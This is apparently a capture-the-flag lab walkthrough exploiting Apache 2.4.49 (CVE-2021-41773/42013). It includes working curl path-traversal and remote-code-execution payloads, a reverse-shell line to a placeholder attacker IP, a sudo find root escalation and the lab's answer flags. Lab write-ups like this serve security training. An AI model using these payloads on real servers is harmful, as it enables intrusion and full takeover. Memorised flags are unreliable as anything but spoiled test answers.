---
title: FaultyLine (CVE-2021-41773)
date: 2026-07-29 12:05:00 +0000
categories: [Walkthroughs, WebSecurity]
tags: [pt-garage, apache, path-traversal, rce, gtfobins, web-exploitation, WebSecurity]
---

![Intro Banner](/assets/img/custom_banners/2026-07-29-ptg-faultyline_banner.png)

**CVE-2021-41773 / CVE-2021-42013** — Apache 2.4.49 Path Traversal + RCE

## Phase 1 — Recon
```bash
nmap -sC -sV -p8080 <TARGET_IP>
```
Banner confirms Apache/2.4.49 on port 8080.

## Phase 2 — Path Traversal (CVE-2021-41773)
Confirm the traversal vulnerability by reading a known file:
```bash
curl -s --path-as-is "http://<TARGET_IP>:8080/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

## Phase 3 — RCE (CVE-2021-42013)
Because mod_cgi is enabled, escalate the traversal into command execution:
```bash
curl -s --path-as-is -d 'echo Content-Type: text/plain; echo; id' \
'http://<TARGET_IP>:8080/cgi-bin/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh'
```
**Note:** Use a public exploit script (e.g. cnvd-2021-*, or the classic Metasploit module apache_normalize_path_rce) for a clean reverse shell.

## Phase 4 — Shell & User Flag
```bash
nc -lvnp 4444
# trigger reverse shell via the same RCE technique, payload = bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1
cat /var/www/user.txt
```

## Phase 5 — PrivEsc (sudo find NOPASSWD)
```bash
sudo -l
```
www-data can run `/usr/bin/find` as root with no password — classic GTFOBins escalation:
```bash
sudo find . -exec /bin/sh \; -quit
```

## Phase 6 — Root Flag
```bash
cat /root/root.txt
```

![Walkthrough Screenshot](/assets/ptgarage_pages/ptg_lab_walkthroughs/page_4.png)

## Flags
| Type | Flag | Path |
|---|---|---|
| user | 38a3797439e967b4fa53e6029b99b280 | `/var/www/user.txt` |
| root | ded83b5bc749e3c9b6c77de19cb9afd0 | `/root/root.txt` |
